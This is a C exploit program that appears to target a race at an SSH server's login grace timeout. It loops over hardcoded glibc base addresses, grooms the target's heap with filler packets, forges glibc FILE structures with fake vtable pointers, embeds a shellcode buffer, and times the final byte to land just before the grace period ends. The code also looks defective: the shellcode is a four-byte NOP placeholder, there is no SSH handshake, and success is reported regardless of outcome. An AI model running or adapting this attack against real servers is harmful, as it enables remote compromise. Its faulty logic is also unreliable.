#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_PACKET_SIZE (256 * 1024)
#define LOGIN_GRACE_TIME 120
#define MAX_STARTUPS 100
#define CHUNK_ALIGN(s) (((s) + 15) & ~15)

uint64_t GLIBC_BASES[] = { 0xb7200000, 0xb7400000 };
int NUM_GLIBC_BASES = sizeof(GLIBC_BASES) / sizeof(GLIBC_BASES[0]);

unsigned char shellcode[] = "\x90\x90\x90\x90";

int setup_connection(const char *ip, int port);
void send_packet_retry(int sock, const unsigned char *data, size_t len);
void prepare_heap(int sock);
int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base);
void create_public_key_packet(unsigned char *packet, size_t size, uint64_t glibc_base);
void create_fake_file_structure(unsigned char *data, size_t size, uint64_t glibc_base);

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <ip> <port>\n", argv[0]);
        exit(1);
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    double parsing_time = 0;
    int success = 0;

    srand(time(NULL));

    for (int base_idx = 0; base_idx < NUM_GLIBC_BASES && !success; base_idx++) {
        uint64_t glibc_base = GLIBC_BASES[base_idx];
        printf("Attempting exploitation with glibc base: 0x%lx\n", glibc_base);

        for (int attempt = 0; attempt < 20000 && !success; attempt++) {
            if (attempt % 1000 == 0) {
                printf("Attempt %d of 20000\n", attempt);
            }

            int sock = setup_connection(ip, port);
            if (sock < 0) {
                fprintf(stderr, "Failed to establish connection, attempt %d\n", attempt);
                continue;
            }

            prepare_heap(sock);

            if (attempt_race_condition(sock, parsing_time, glibc_base)) {
                printf("Possible exploitation success on attempt %d with glibc base 0x%lx!\n", attempt, glibc_base);
                success = 1;
                break;
            }

            close(sock);
            usleep(100000); // Delay between attempts
        }
    }

    return !success;
}

int setup_connection(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK); // Non-blocking mode

    return sock;
}

void send_packet_retry(int sock, const unsigned char *data, size_t len) {
    size_t total_sent = 0;
    while (total_sent < len) {
        ssize_t sent = send(sock, data + total_sent, len - total_sent, 0);
        if (sent > 0) {
            total_sent += sent;
        } else if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            usleep(1000); // Wait 1ms and retry
            continue;
        } else {
            perror("send_packet");
            break;
        }
    }
}

void prepare_heap(int sock) {
    for (int i = 0; i < 10; i++) {
        unsigned char tcache_chunk[64];
        memset(tcache_chunk, 'A', sizeof(tcache_chunk));
        send_packet_retry(sock, tcache_chunk, sizeof(tcache_chunk));
    }

    for (int i = 0; i < 27; i++) {
        unsigned char large_hole[8192];
        memset(large_hole, 'B', sizeof(large_hole));
        send_packet_retry(sock, large_hole, sizeof(large_hole));

        unsigned char small_hole[320];
        memset(small_hole, 'C', sizeof(small_hole));
        send_packet_retry(sock, small_hole, sizeof(small_hole));
    }

    for (int i = 0; i < 27; i++) {
        unsigned char fake_data[4096];
        create_fake_file_structure(fake_data, sizeof(fake_data), GLIBC_BASES[0]);
        send_packet_retry(sock, fake_data, sizeof(fake_data));
    }

    unsigned char large_string[MAX_PACKET_SIZE - 1];
    memset(large_string, 'E', sizeof(large_string));
    send_packet_retry(sock, large_string, sizeof(large_string));
}

void create_fake_file_structure(unsigned char *data, size_t size, uint64_t glibc_base) {
    memset(data, 0, size);

    struct {
        void *_IO_read_ptr;
        void *_IO_read_end;
        void *_IO_read_base;
        void *_IO_write_base;
        void *_IO_write_ptr;
        void *_IO_write_end;
        void *_IO_buf_base;
        void *_IO_buf_end;
        void *_IO_save_base;
        void *_IO_backup_base;
        void *_IO_save_end;
        void *_markers;
        void *_chain;
        int _fileno;
        int _flags;
        int _mode;
        char _unused2[40];
        void *_vtable_offset;
    } *fake_file = (void *)data;

    fake_file->_vtable_offset = (void *)0x61;
    *(uint64_t *)(data + size - 16) = glibc_base + 0x21b740; // fake vtable
    *(uint64_t *)(data + size - 8) = glibc_base + 0x21d7f8;  // fake _codecvt
}

void create_public_key_packet(unsigned char *packet, size_t size, uint64_t glibc_base) {
    memset(packet, 0, size);

    size_t offset = 0;
    for (int i = 0; i < 27; i++) {
        *(uint32_t *)(packet + offset) = CHUNK_ALIGN(4096);
        offset += CHUNK_ALIGN(4096);
        *(uint32_t *)(packet + offset) = CHUNK_ALIGN(304);
        offset += CHUNK_ALIGN(304);
    }

    memcpy(packet, "ssh-rsa ", 8);
    memcpy(packet + CHUNK_ALIGN(4096) * 13 + CHUNK_ALIGN(304) * 13, shellcode, sizeof(shellcode));

    for (int i = 0; i < 27; i++) {
        create_fake_file_structure(packet + CHUNK_ALIGN(4096) * (i + 1) + CHUNK_ALIGN(304) * i,
                                   CHUNK_ALIGN(304), glibc_base);
    }
}

int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base) {
    unsigned char final_packet[MAX_PACKET_SIZE];
    create_public_key_packet(final_packet, sizeof(final_packet), glibc_base);

    ssize_t total_sent = 0;
    while (total_sent < sizeof(final_packet) - 1) {
        ssize_t sent = send(sock, final_packet + total_sent, sizeof(final_packet) - 1 - total_sent, 0);
        if (sent > 0) {
            total_sent += sent;
        } else if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            usleep(1000);
            continue;
        } else {
            perror("send_packet");
            return 0;
        }
    }

    struct timespec start, current;
    clock_gettime(CLOCK_MONOTONIC, &start);
    while (1) {
        clock_gettime(CLOCK_MONOTONIC, &current);
        double elapsed = (current.tv_sec - start.tv_sec) + (current.tv_nsec - start.tv_nsec) / 1e9;
        if (elapsed >= (LOGIN_GRACE_TIME - parsing_time - 0.001)) {
            if (send(sock, &final_packet[sizeof(final_packet) - 1], 1, 0) < 0) {
                perror("send last byte");
                return 0;
            }
            break;
        }
    }

    return 1;
}
